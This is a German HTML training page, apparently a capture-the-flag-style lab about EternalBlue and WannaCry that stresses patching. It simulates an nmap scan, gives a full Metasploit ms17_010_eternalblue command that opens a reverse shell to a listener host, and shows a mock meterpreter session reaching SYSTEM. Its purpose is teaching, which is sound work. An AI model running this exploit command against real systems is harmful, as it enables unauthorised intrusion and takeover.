<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Patch-Lab: Blue und WannaCry</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #fff;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }
        h1 {
            text-align: center;
            color: #007bff;
        }
        .console {
            background: #000;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
            border-radius: 5px;
            height: 300px;
            overflow-y: auto;
            margin-bottom: 20px;
        }
        .btn {
            display: block;
            margin: 10px auto;
            padding: 10px 20px;
            background: #007bff;
            color: #fff;
            text-align: center;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .btn:hover {
            background: #0056b3;
        }
        .hidden {
            display: none;
        }
        pre {
            background: #f4f4f4;
            padding: 10px;
            border-left: 4px solid #007bff;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Patch-Lab: Blue und WannaCry</h1>
        <p>
            Im Jahr 2017 wurde durch eine Schwachstelle im SMBv1-Protokoll ein Exploit namens <strong>EternalBlue</strong> bekannt. 
            Dieser wurde von der Ransomware <strong>WannaCry</strong> ausgenutzt, um Millionen ungepatchter Systeme weltweit anzugreifen. 
            Durch regelmäßige Sicherheitsupdates hätte dieser Angriff verhindert werden können.
        </p>

        <h2>Schritt 1: Netzwerkscan mit Nmap</h2>
        <p>
            Führe mit dem Befehl <code>nmap -sV [IP]</code> einen Netzwerkscan durch, um offene Ports und Dienste zu finden. 
            Scanne beide IP-Adressen und finde heraus, welche angreifbar ist.
        </p>
        <pre>
LHOST=192.168.1.100
RHOST1=192.168.1.10
RHOST2=192.168.1.20
        </pre>
        <div id="step-1" class="step">
            <button class="btn" onclick="scanIP('RHOST1')">Scan für RHOST1 starten</button>
            <button class="btn" onclick="scanIP('RHOST2')">Scan für RHOST2 starten</button>
            <div class="console" id="console-1"></div>
        </div>

        <div id="step-2" class="hidden">
            <h2>Schritt 2: Exploit vorbereiten</h2>
            <p>
                Jetzt greifen wir das anfällige System mit einem Exploit an. Nutze den folgenden Befehl, um eine Verbindung zum Zielsystem herzustellen:
            </p>
            <pre>
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST [Angreifbares Ziel]; run"
            </pre>
            <button class="btn" onclick="runExploit()">Exploit ausführen</button>
            <div class="console" id="console-2"></div>
        </div>

        <div id="step-3" class="hidden">
            <h2>Schritt 3: Reverse Shell und Zugang</h2>
            <p>
                Nach erfolgreichem Angriff haben wir Zugriff auf das System. Dies geschieht über eine sogenannte <strong>Reverse Shell</strong>, 
                bei der sich das Zielsystem mit unserem angreifenden Computer verbindet. Dies ermöglicht es, Befehle auf dem Zielsystem auszuführen.
            </p>
            <div class="console">
                <p>meterpreter > sysinfo</p>
                <p>Computer Name: Victim-PC</p>
                <p>OS: Windows 7 (Build 7601, Service Pack 1)</p>
                <p>meterpreter > getuid</p>
                <p>Server username: NT AUTHORITY\SYSTEM</p>
                <p>meterpreter > cat flag.txt</p>
                <p style="color: green;">Flag: {PATCH_THE_PATCH}</p>
            </div>
            <a href="index.html" class="btn">Zurück zum Hauptmenü</a>
        </div>
    </div>

    <script>
        function scanIP(target) {
            const console1 = document.getElementById("console-1");
            console1.innerHTML += `Starte Scan für ${target}...\n`;
            setTimeout(() => {
                if (target === "RHOST1") {
                    console1.innerHTML += "192.168.1.10 - Windows 10 (gepatcht, sicher)\n";
                } else if (target === "RHOST2") {
                    console1.innerHTML += "192.168.1.20 - Windows 7 (ungepatcht, anfällig)\n";
                }
            }, 2000);
            setTimeout(() => {
                if (target === "RHOST2") {
                    document.getElementById("step-1").classList.add("hidden");
                    document.getElementById("step-2").classList.remove("hidden");
                }
            }, 4000);
        }

        function runExploit() {
            const console2 = document.getElementById("console-2");
            console2.innerHTML = "Starte Exploit...\n";
            setTimeout(() => {
                console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
                setTimeout(() => {
                    document.getElementById("step-2").classList.add("hidden");
                    document.getElementById("step-3").classList.remove("hidden");
                }, 2000);
            }, 3000);
        }
    </script>
</body>
</html>


